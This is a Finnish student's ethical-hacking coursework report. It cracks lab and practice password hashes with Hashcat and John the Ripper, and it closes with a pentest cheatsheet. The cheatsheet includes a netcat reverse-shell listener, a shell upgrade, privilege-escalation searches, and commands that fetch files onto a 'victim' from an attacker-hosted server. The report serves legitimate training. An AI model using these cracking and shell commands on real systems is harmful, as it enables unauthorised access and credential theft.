Testaukset tehty Windows 10 käyttöjärjestelmällä, Version 10.0.19045 Build 19045. Tämän lisäksi käytetty myös Kali Linux versio 2023.3 ajettuna VirtualBox Version 7.0.12 r159484 (Qt5.15.2) kautta,  Prosessorina Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz, 16GB RAM

[https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h7-hash](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h7-hash)

---

#### x) Lue/katso/kuuntele ja tiivistä. 

##### Karvinen 2022: [Cracking Passwords with Hashcat](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/)
  - Salasanoja ei tallenneta järjestelmiin alkuperäisessä muodossa, vaan tiivisteinä.
  - Hashaaminen on yksisuuntainen funktio, eli sitä ei voi peruuttaa
  - Tiivisteiden purkaminen perustuu vertailuun, jossa kohdetiivistettä vertaillaan sanakirjasta johdettuihin tiivisteisiin
  - Hashcat on ohjelma, joka tekee tälläistä vertailua
  - Asennus ja käyttöönotto:
      
```

// Päivitä ja asenna
$ sudo apt-get update
$ sudo apt-get -y install hashid hashcat wget
// Tee hakemisto työskentelyä varten ja siirry sinne
$ mkdir hashed
$ cd hashed
// Hanki iso sanakirja, esim. yksi suosituimpia on rockyou
$ wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$ tar xf rockyou.txt.tar.gz
$ rm rockyou.txt.tar.gz

```

  - Rockyou on sanakirja, jossa on yli 14 miljoonaa sanaa
  - Tiivisteitä voidaan tehdä erilaisilla hajautusalgoritmeilla. Hashcatilla voi selvitellä mahdollisia käytettyjä algoritmeja: `hashid -m <tiiviste>`
  - Parametri -m näyttää hashid-analyysissa numeron, jota voidaan myös käyttää Hashcatissa purkamaan valitun algoritmin perusteella, esim. md5 -> 0, SHA256 -> 1400
  - Esimerkit käytöstä, näistä lisää kohdassa d) Cheatsheet. (ja aiemmissa läksykohdissa)
  - Jos käyttö on omaan makuun liian hidasta, näitä voi ajaa hostikoneella. Näytönohjaimen hyödyntäminen murtamisessa saattaa nopeuttaa hashcatin toimintaa.
    
##### Karvinen 2023: [Crack File Password With John](https://terokarvinen.com/2023/crack-file-password-with-john/)
  - Kuten Hashcat, myös John the Ripper on salasanojen murtoihin erikoistuva ohjelma
  - Jumbo-versiolla onnistuu monimutkaisemmat murtamiset, kuten salasanoilla suojattujen zip-pakettien salasanojen murtaminen
  - Asennus ja käyttöönotto:

```

$ sudo apt-get update
// Tuollaisenaan tulee toiminnallisuuksia, jotka jo löytyvät esim. testauksessa käytetystä Kali Linuxista (esim. bash-completion)
$ sudo apt-get -y install micro bash-completion git build-essential libssl-dev zlib1g zlib1g-dev zlib-gst libbz2-1.0 libbz2-dev atool zip wget
// --depth=1 lataa vain uusimmat versiot, ei koko repoa
$ git clone --depth=1 https://github.com/openwall/john.git

$ cd john/src/
// Jos puuttuu riippuvaisuuksia, tässä kohtaa tulee siitä ilmoituksia. Kannattanee asentaa mahdolliset puuttuvat kirjastot.
$ ./configure
// Koodin kompilointi
$ make -s clean && make -sj4
// Kompiloinnin jälkeen Johnin voi laittaa pyörimään. Jos saat versiotiedon, se on mitä luultavammin käyttövalmis
$ $HOME/john/run/john 

```
![Alt text](image-6.png)

  - Kuten aiemmin sanottu, Johnilla voi murtaa monenlaisia tiedostoja: `1password 7z DPAPImk adxcsouf aem aix aix andotp androidbackup androidfde ansible apex apop applenotes aruba atmail axcrypt bestcrypt bestcryptve bitcoin bitlocker bitshares bitwarden bks blockchain cardano ccache cisco cracf dashlane deepsound diskcryptor dmg dmg ecryptfs ejabberd electrum encdatavault encfs enpass ethereum filezilla geli gpg hccap hccapx htdigest ibmiscanner ikescan itunes_backup iwork kdcdump keepass keychain keyring keystore kirbi known_hosts krb kwallet lastpass ldif libreoffice lion lion lotus luks mac mac mcafee_epo monero money mongodb mosquitto mozilla multibit neo network office openbsd_softraid openssl padlock pcap pdf pem pfx pgpdisk pgpsda pgpwde prosody ps_token pse putty pwsafe racf radius radius rar restic sap sense signal sipdump ssh sspr staroffice strip telegram test_tezos tezos truecrypt uaf vdi vmx wpapcap zed zip`
  - Ohjeet sisältävät esimerkkinä zippitiedoston, jonka salasanan voi kokeilla murtaa. Vaikuttaa kivalta kohteelta b)-kohtaan!

---

#### a) Hashcat. Asenna Hashcat ja testaa sen toimivuus ratkaisemalla tiiviste.

Hashcat tulee valmiiksi asennettuna Kali Linuxissa. Ajoin virtuaalikoneen käynnistyksen yhteydessä apt-get updaten, ja varmistin, että hashcat todella löytyy. Sen jälkeen kopioin myös rockyoun luotuun työkansioon:

```

┌──(susi㉿isopaha)-[~]
└─$ sudo apt-get update    

┌──(susi㉿isopaha)-[~]
└─$ hashcat                                                                         
Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...

Try --help for more help.

┌──(susi㉿isopaha)-[~]
└─$ mkdir crackhash 
                                                                                            
┌──(susi㉿isopaha)-[~]
└─$ cd crackhash 

┌──(susi㉿isopaha)-[~/crackhash]
└─$ wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
[...leikattu tulostetta...]
rockyou.txt.tar.gz     100%[============================>]  50.82M  11.0MB/s    in 4.6s    

2023-12-06 00:33:20 (11.0 MB/s) - ‘rockyou.txt.tar.gz’ saved [53291283/53291283]


```

Ohje sanalistan hakuun, ja yleisesti Hashcatiin otettu Tero Karvisen artikkelista [Cracking Passwords with Hashcat](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/).
Komento `tar xf` ajaa tar-ohjelman, tarin man-sivujen mukaan x extractaa (purkaa) ja f määrittää purettavan tiedoston nimeksi arkiston nimen.

```

-x, --extract, --get
              Extract  files  from an archive.  Arguments are optional.  When given, they
              specify names of the archive members to be extracted.

[...]

 -f, --file=ARCHIVE
              Use  archive file or device ARCHIVE.  If this option is not given, tar will
              first examine the environment variable ‘TAPE’.  If it  is  set,  its  value
              will be used as the archive name.  Otherwise, tar will assume the compiled‐
              in default.  The default value can be inspected either using the --show-de‐
              faults option, or at the end of the tar --help output.

```

![image](https://github.com/sawulohi/PenTest/assets/117188828/66f05845-2cb0-4ed5-b2d2-405fcdb89c7b)

Sitten ajellaan. Kokeillaan alkuun [Teron artikkelissa](https://terokarvinen.com/2022/cracking-passwords-with-hashcat/) mainittua tiivistettä `6b1628b016dff46e6fa35684be6acc96`

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashid -m 6b1628b016dff46e6fa35684be6acc96                                
Analyzing '6b1628b016dff46e6fa35684be6acc96'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]

```

Esimerkissä oli vähän tylsästi spoilattu, että kyseessä on md5-tiiviste

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashcat -m 0 6b1628b016dff46e6fa35684be6acc96 rockyou.txt 
hashcat (v6.2.6) starting

[...tulostetta pätkitty...]

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

6b1628b016dff46e6fa35684be6acc96:summer                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)


```

Totta tosiaan, tiiviste oli tehty md5-hajautusalgoritmilla, ja se oli tehty merkkijonosta 'summer'. Voisin vielä kokeilla esim. Metasploitablessa löytyneistä tiivisteistä. Koska olin laiskalla päällä, hain [Antti Halosen kotitehtävistä](https://github.com/therealhalonen/penetration_testing/blob/master/h1/report.md#n-vapaaehtoinen-murtaudu-johonkin-toiseen-metasploitablen-palveluun) valmiita tiivisteitä, jotka oli hankittu Metasploitablesta.
Hänen tehtävissään oli tehty tiivistelista seuraavanlaisista tiivisteistä:

```

$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//

```

Tein tiivisteistä tiedoston nimeltä `hashmenu`. Antin läksyistä ilmeni, että Hashcattia voisi ajaa vaikka kaikkiin tiivisteisiin kerralla! Kuulostaa mainiolta lähestymistavalta laiskalle ihmiselle.

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashid -m hashmenu                                       
--File 'hashmenu'--
Analyzing '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
Analyzing '$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//'
[+] MD5 Crypt [Hashcat Mode: 500]
[+] Cisco-IOS(MD5) [Hashcat Mode: 500]
[+] FreeBSD MD5 [Hashcat Mode: 500]
--End of file 'hashmenu'--        

```

Kaikki tiedostot kertovat vain yhtä ja ainoaa totuutta, md5-algoritmi ja koodi 500 ovat avainasemassa purkamiseen. Koitetaan purkaa tiivisteet rockyoulla omaan tiedostoonsa:

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashcat -m 500 hashmenu -o puretut

```

Lippu `-o`vie tulokset tiedostoon, jonka nimeksi annoin puretut. Lippu `-m` avattiin jo aiemmin, mutta se tosiaan viittaa käytettävään tiivistealgoritmiin. Hashcat pureskeli kansiota jonkin aikaa, ehkä muutamia minuutteja. 

```

No password candidates received in stdin mode, aborting

Session..........: hashcat
Status...........: Aborted
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: hashmenu
Time.Started.....: Wed Dec  6 00:59:31 2023 (2 mins, 1 sec)
Time.Estimated...: Wed Dec  6 01:01:32 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: Pipe
Speed.#1.........:        0 H/s (0.00ms) @ Accel:64 Loops:1000 Thr:1 Vec:4
Recovered........: 0/7 (0.00%) Digests (total), 0/7 (0.00%) Digests (new), 0/7 (0.00%) Salts

```

Voi nenä. Eipä onnistunut. Nähtävästi ainakin kansioissa tulee käyttää **hyökkäystilaa**, jota operoidaan lipulla -a [hyökkäysmetodin numero] -> `man hashcat`:

```

[...]

-a, --attack-mode=NUM
              Attack‐mode, see references below

[...]

Attack mode
       0 = Straight
       1 = Combination
       3 = Brute-force
       6 = Hybrid Wordlist + Mask
       7 = Hybrid Mask + Wordlist

```

Kokeillaan suoraa lähestymistapaa. Ei vaan hetkinen. En ollut myöskään määrittänyt käytettävää sanakirjaa. Ei ihmekkään, ettei sanoja löytynyt Laitetaan sekin ajettavaan komentoon.

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashcat -a 0 -m 500 hashmenu rockyou.txt -o puretut

```

Hashcat lähti pureskelemaan. Käyttöliittymä antoi minulle mahdollisuuden tarkistella etenemistä s-näppäimellä, jota painelin Hashcatin ajellessa.

```

Session..........: hashcat
Status...........: Running
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: hashmenu
Time.Started.....: Wed Dec  6 01:09:26 2023 (1 min, 21 secs)
Time.Estimated...: Wed Dec  6 04:20:24 2023 (3 hours, 9 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5007 H/s (12.72ms) @ Accel:256 Loops:250 Thr:1 Vec:4
Recovered........: 3/7 (42.86%) Digests (total), 0/7 (0.00%) Digests (new), 3/7 (42.86%) Salts
Progress.........: 709376/100410688 (0.71%)
Rejected.........: 0/709376 (0.00%)
Restore.Point....: 101120/14344384 (0.70%)
Restore.Sub.#1...: Salt:6 Amplifier:0-1 Iteration:750-1000
Candidate.Engine.: Device Generator
Candidates.#1....: jyothi -> ilovegus
Hardware.Mon.#1..: Util:100%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 

```

Tulosteesta päätellen tässä vaiheessa oli jo purettu onnistuneesti 3/7 tiivistettä. Progress näytti uhkaavan pieneltä (0.71%), joten harkitsin ajamisen keskeyttämistä. Myös Time.estimated antoi arvioksi 3 tuntia, joten päätin tyytyä pienempään määrään purettuja tiivisteitä. Painoin `f` niin kuin finish päättääkseni murtamiskierroksen.

```

Finish enabled. Will quit after this attack.
// Painoin tässä kohtaa epähuomiossa ctrl + c, joka lopetti prosessin hetimmiten.
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => ^C

┌──(susi㉿isopaha)-[~/crackhash]
└─$ cat puretut                                        
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service

```

Sain kolme salasanatiivistettä auki! Jatkokehitysideana olisi päivittää päätoiminen käyttöjärjestelmä Linuxiin, taikka allokoida virtuaalikoneelle enemmän tehoja esim. näytönohjaimesta, jos sellainen on VirtualBoxissa mahdollista. Vaihtoehtoisesti voisi käyttää kohdistetumpaa sanalistaa, kenties jotain joka kohdistuu nimenomaisesti Metasploitableen.

![image](https://github.com/sawulohi/PenTest/assets/117188828/ca9df8ad-d69a-4a4a-a7f3-adaa2d3f1761)

#### b) John. Asenna Jumbo John ja testaa sen toimivuus murtamalla jonkin tiedoston salasana.

Tero Karvisen artikkelista [Crack File Password With John](https://terokarvinen.com/2023/crack-file-password-with-john/) saadulla komennolla varmistin, että Kalissa on kaikki tarvittavat osat Johnin käyttöön. Komento sisältää myös muita yleishyödyllisiä toiminnallisuuksia, jotka epäilen myös löytyvän valmiina Kalista. En poistanut komennosta kohtia, sillä en kokenut minkään komennossa olevan tuntemani softan (kuten micro, tekstinkäsittelyohjelma) olevan turha.

```

┌──(susi㉿isopaha)-[~]
└─$ sudo apt-get -y install micro bash-completion git build-essential libssl-dev zlib1g zlib1g-dev zlib-gst libbz2-1.0 libbz2-dev atool zip wget

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
E: Unable to locate package zlib-gst

```

Vähän pelottavaa, ettei yhtä Johnin tarvitsemista kirjastoista löydy... Kokeillaan siitä huolimatta jatkaa harjoittelua, ja palataan tähän kohtaan mikäli ongelmia ilmenee. Seuraavaksi ohjeessa kehotettiin konfiguroimaan ja kompiloimaan John, mutta annetuilla komennoilla se ei onnistunut. Siirryin seuraavaan kohtaan, ja totesin, että run-hakemistosta löytyi ohjeessa mainittuja executableja:

```

┌──(susi㉿isopaha)-[~/john]
└─$ cd run  
                                                                                            
┌──(susi㉿isopaha)-[~/john/run]
└─$ ls    
1password2john.py              fuzz_option.pl            opencl
7z2john.pl                     geli2john.py              openssl2john.py
DPAPImk2john.py                genincstats.rb            oui.txt
adxcsouf2john.py               hccapx2john.py            padlock2john.py
aem2john.py                    hextoraw.pl               pass_gen.pl
aix2john.pl                    htdigest2john.py          password.lst
aix2john.py                    hybrid.conf               pcap2john.py
alnum.chr                      ibmiscanner2john.py       pdf2john.pl
alnumspace.chr                 ikescan2john.py           pdf2john.py
alpha.chr                      ios7tojohn.pl             pem2john.py
andotp2john.py                 itunes_backup2john.pl     pfx2john.py
androidbackup2john.py          iwork2john.py             pgpdisk2john.py
androidfde2john.py             john.bash_completion      pgpsda2john.py
ansible2john.py                john.conf                 pgpwde2john.py
apex2john.py                   john.zsh_completion       pkcs12kdf.py
apop2john.py                   jtr_rulez.pm              potcheck.pl
applenotes2john.py             jtrconf.pm                prosody2john.py
aruba2john.py                  kdcdump2john.py           protobuf
ascii.chr                      keplr2john.py             ps_token2john.py
atmail2john.pl                 keychain2john.py          pse2john.py
axcrypt2john.py                keyring2john.py           pwsafe2john.py
benchmark-unify                keystore2john.py          radius2john.pl
bestcrypt2john.py              kirbi2john.py             radius2john.py
bestcryptve2john.py            known_hosts2john.py       regex_alphabets.conf
bip-0039                       korelogic.conf            relbench
bitcoin2john.py                krb2john.py               repeats16.conf
bitshares2john.py              kwallet2john.py           repeats32.conf
bitwarden2john.py              lanman.chr                restic2john.py
bks2john.py                    lastpass2john.py          rexgen2rules.pl
blockchain2john.py             latin1.chr                rules
cardano2john.py                ldif2john.pl              rules-by-rate.conf
ccache2john.py                 leet.pl                   rules-by-score.conf
ccl_chrome_indexeddb           lib                       rulestack.pl
cisco2john.pl                  libreoffice2john.py       sap2john.pl
codepage.pl                    lion2john-alt.pl          sense2john.py
coinomi2john.py                lion2john.pl              sha-dump.pl
cracf2john.py                  lm_ascii.chr              sha-test.pl
dashlane2john.py               lotus2john.py             signal2john.py
deepsound2john.py              lower.chr                 sipdump2john.py
dictionary.rfc2865             lowernum.chr              ssh2john.py
digits.chr                     lowerspace.chr            sspr2john.py
diskcryptor2john.py            luks2john.py              staroffice2john.py
dmg2john.py                    mac2john-alt.py           stats
dns                            mac2john.py               strip2john.py
dumb16.conf                    mailer                    telegram2john.py
dumb32.conf                    makechr                   test_tezos2john.py
dynamic.conf                   mcafee_epo2john.py        tezos2john.py
dynamic_disabled.conf          monero2john.py            truecrypt2john.py
dynamic_flat_sse_formats.conf  money2john.py             unisubst.conf
ecryptfs2john.py               mongodb2john.js           unrule.pl
ejabberd2john.py               mosquitto2john.py         upper.chr
electrum2john.py               mozilla2john.py           uppernum.chr
encdatavault2john.py           multibit2john.py          utf8.chr
encfs2john.py                  neo2john.py               vdi2john.pl
enpass2john.py                 netntlm.pl                vmx2john.py
enpass5tojohn.py               netscreen.py              zed2john.py
ethereum2john.py               network2john.lua          ztex
filezilla2john.py              office2john.py
fuzz.dic                       openbsd_softraid2john.py

```

Sitten ajoin Johnin

```

┌──(susi㉿isopaha)-[~/john/run]
└─$ john
Created directory: /home/susi/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.

```

Latasin ohjeessa olevan harjoitusfilun:

```

┌──(susi㉿isopaha)-[~]
└─$ wget https://TeroKarvinen.com/2023/crack-file-password-with-john/tero.zip
--2023-12-09 18:35:00--  https://terokarvinen.com/2023/crack-file-password-with-john/tero.zip
Resolving terokarvinen.com (terokarvinen.com)... 139.162.131.217
Connecting to terokarvinen.com (terokarvinen.com)|139.162.131.217|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 543 [application/zip]
Saving to: ‘tero.zip’

tero.zip               100%[============================>]     543  --.-KB/s    in 0s      

2023-12-09 18:35:00 (22.6 MB/s) - ‘tero.zip’ saved [543/543]

```

Kokeillaan avata:

```

┌──(susi㉿isopaha)-[~]
└─$ unzip tero.zip 
Archive:  tero.zip
   creating: secretFiles/
[tero.zip] secretFiles/SECRET.md password: 
password incorrect--reenter: 
password incorrect--reenter: 

```

Tässä kohtaa koetin ajaa zip2johnin, mutta sitä ei ollut johnin hakemistossa. Selvittelin ongelmaa, ja toistin asennuksen vaiheet. `./configure`-komentoa ajaessa en ollut huomannut puutteellista kirjastoa:

![Alt text](image.png)

![Alt text](image-1.png)

Ilmeisesti Kalilta puuttui tarvittava openssl-kirjasto. Päätin ajaa konfiguraation annetulla lipulla `--without-openssl`. Konfiguroinnissa kesti nyt huomattavasti pidempään, ja aiemmin virheilmoitusta antava `make`-komento lähti myös toimimaan.

![Alt text](image-2.png)

Sitten zip2johnin ajoon, ja siitä johnin ajoon saadulla tiivisteellä.

```

┌──(susi㉿isopaha)-[~]
└─$ john/run/zip2john  tero.zip > tero.zip.hash  
ver 1.0 tero.zip/secretFiles/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 tero.zip/secretFiles/SECRET.md PKZIP Encr: TS_chk, cmplen=183, decmplen=217, crc=4C752C85 ts=572B cs=572b type=8

┌──(susi㉿isopaha)-[~]
└─$ john/run/john tero.zip.hash                
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Warning: OpenMP is disabled; a non-OpenMP build may be faster
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
0g 0:00:00:00 DONE 1/3 (2023-12-09 19:05) 0g/s 1056Kp/s 1056Kc/s 1056KC/s Mdzip1900..Msecret1900
Proceeding with wordlist:john/run/password.lst
Enabling duplicate candidate password suppressor
butterfly        (tero.zip/secretFiles/SECRET.md)     
1g 0:00:00:00 DONE 2/3 (2023-12-09 19:05) 1.099g/s 94341p/s 94341c/s 94341C/s butterfly..december
Use the "--show" option to display all of the cracked passwords reliably


```

Syötetään salasana unzippiin:

![Alt text](image-3.png)


#### c) f5bc7fcc7f5b3b6af7ff79e0feafad6d1a948b6a2c18de414993c1226be48c1f on erään tällä tehtäväsivulla olevan yksittäisen sanan tiiviste. Käytin hyvin yleistä ja tunnettua tiivistealgoritmia. Sanassa voi olla isoja kirjaimia, mutta ei erikoismerkkejä. Minkä sanan tiiviste on kyseessä?

Tehtävää voisi lähestyä tekemällä oman sanalistan kopioimalla sivun sisällön ja putkittamalla esim `|tr`, korvata välilyönnit rivinvaihdoilla yms. yms.

Tai voi käyttää Cewliä

![Alt text](image-4.png)

man-sivuilta saatiin lippu `-w`, jolla voidaan kirjoittaa sivustolta kerätyt sanat tiedostoon.

```

┌──(susi㉿isopaha)-[~]
└─$ cewl -w sanalista https://terokarvinen.com/2023/eettinen-hakkerointi-2023/
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

```

CeWL lähti ruksuttelemaan sanoja listaan. Tässä kesti joitakin minuutteja. Tarkastellaan odotellessa Hashcatilla, mitä tiivistealgoritmia tiivisteessä on käytetty:

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashid -m f5bc7fcc7f5b3b6af7ff79e0feafad6d1a948b6a2c18de414993c1226be48c1f 
Analyzing 'f5bc7fcc7f5b3b6af7ff79e0feafad6d1a948b6a2c18de414993c1226be48c1f'
[+] Snefru-256 
[+] SHA-256 [Hashcat Mode: 1400]
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 [Hashcat Mode: 6900]
[+] GOST CryptoPro S-Box 
[+] SHA3-256 [Hashcat Mode: 5000]
[+] Skein-256 
[+] Skein-512(256) 

```

SHA-256 näyttää lupaavalta vaihtoehdolta. Tarkistetaan sillä cewlin antamaa sanalistaa vastaan:

```

┌──(susi㉿isopaha)-[~/crackhash]
└─$ hashcat -m 1400 f5bc7fcc7f5b3b6af7ff79e0feafad6d1a948b6a2c18de414993c1226be48c1f sanalista -o supersalainen

```

![Alt text](image-5.png)

#### d) Cheatsheet. Kerää kurssilaisten raporteista käteviä tekniikoita. Kerää itse tekniikat ja komennot, älä pelkästään kuvaile. Muista lähdeviitteet. Tee tiivis ja selkeä cheatsheet, josta löydät tarvittavat tiedot lipunryöstössä. (Tässä alatehtävässä ei tarvitse tehdä testejä koneella)

Käytetyt lähteet:
[https://github.com/miljonka/Tunkeutumistestaus/wiki/h5_Final-Countdown#y-the-super-ultimate-hakk3r-che33tsheet-001](https://github.com/miljonka/Tunkeutumistestaus/wiki/h5_Final-Countdown#y-the-super-ultimate-hakk3r-che33tsheet-001-tee-tiivistelm%C3%A4-omista-ja-kavereiden-parhaista-tunketumistekniikoista-ole-t%C3%A4sm%C3%A4llinen-liit%C3%A4-komennot-mukaan-t%C3%A4m%C3%A4n-kohdan-vastaus-lienee-pidempi-kuin-aiempien-x-teht%C3%A4vien-viittaa-l%C3%A4hteisiin-t%C3%A4ss%C3%A4-alakohdassa-ei-tarvitse-ajaa-komentoja-tietokoneella)
[https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md](https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md)

---

# Recon

### Nmap

```

$ sudo nmap -sC -sV {target_IP} -p-
// -sC | default script scan
// -sV | determine service/version info
// -p- | scan ports from 1 - 65535
// -oA {filename} | save output to a file

```

Hyvä jatkolähde [miljonkalta](https://github.com/miljonka/Tunkeutumistestaus/wiki/h5_Final-Countdown#y-the-super-ultimate-hakk3r-che33tsheet-001-tee-tiivistelm%C3%A4-omista-ja-kavereiden-parhaista-tunketumistekniikoista-ole-t%C3%A4sm%C3%A4llinen-liit%C3%A4-komennot-mukaan-t%C3%A4m%C3%A4n-kohdan-vastaus-lienee-pidempi-kuin-aiempien-x-teht%C3%A4vien-viittaa-l%C3%A4hteisiin-t%C3%A4ss%C3%A4-alakohdassa-ei-tarvitse-ajaa-komentoja-tietokoneella): [https://www.stationx.net/nmap-cheat-sheet/](https://www.stationx.net/nmap-cheat-sheet/)

## Fuzzaaminen

### ffuf

```

$ ffuf -u http://192.168.56.5/FUZZ -w /usr/share/wordlists/dirb/common.txt 
// -u | url
// -w | wordlist

```

[https://www.kali.org/tools/ffuf/](https://www.kali.org/tools/ffuf/)

### GoBuster

```

$ gobuster dir -u http://{target_IP}/ -w /usr/share/wordlists/dirb/common.txt

$ gobuster vhost -u http://{target_IP} -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt 


// dir | directories
// vhost | subdomains
// -u | url
// -w | wordlist

```

---

# Initial access

### Cewl

`cewl -w sanalista [url]`

### Hashcat [https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md](https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md)

```

Hash Mode: -m <id>
   0 | MD5
1400 | SHA2-256 
1700 | SHA2-512

Attack Mode: -a <id>
0 for dictionary
---
3 for mask
Masks:
  ?l | low caps
  ?u | high caps
  ?d | numbers
  ?h | numbers + low caps
  ?H | numbers + high caps
  ?s | special characters
  
Workload 1-4: -w <id>
Disable Potfile: --potfile-disable
Show Cracked Hashes: --show
Out File: -o
Usernames in Hashfile: --usernameide a wordlist

```

### John the Ripper

```

$ {file format}2john secret_file.{file format} > new_file
$ john new_file

example.

$ zip2john folder.zip > hakemisto
$ john hakemisto

// --wordlist={path to file}

```

---

### Improved shell [https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md](https://github.com/therealhalonen/penetration_testing/blob/master/h5/personal_cheatsheet.md)

```

python3 -c 'import pty; pty.spawn("/bin/bash")'

CTRL + z

stty raw -echo; fg
export TERM=xterm

```

### Reverse shell - netcat

`nc -lvnp PORT`

### Reverse shell - muita lähteitä, sisältää monta eri keinoa

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### smbclient

```

$ smbclient -L {target_IP} 
// -L, --list=HOST                              Get a list of shares available on a host

$ smbclient \\\\{target_IP}\\{sharename}
// Connect to share

```

[https://www.computerhope.com/unix/smbclien.htm](https://www.computerhope.com/unix/smbclien.htm)

---

# Oikeuksien korottaminen

```

$ sudo -l
$ -perm -4000 // find SUID
$ -perm -2000 // find GUID
$ netstat -tulnp // listening ports
$ ss -ltnp // listening Ports
$ find / -perm -o+r // find readable
$ find / -name {filename} 2>/dev/null // send error messages to a blackhole
$ find / -user {username} -group {groupname} -size {} 2>/dev/null // find files by username, groupname and/or size

```

### PhishSticksistä tuttu:

```

$ python -m http.server 8000 # On host
$ wget {host_IP}:8000/{filename} # On victim

or 

nc -nlvp {port} > /path/to/file.sh # On victim
nc {target_IP} {port} < file.sh # On host

```


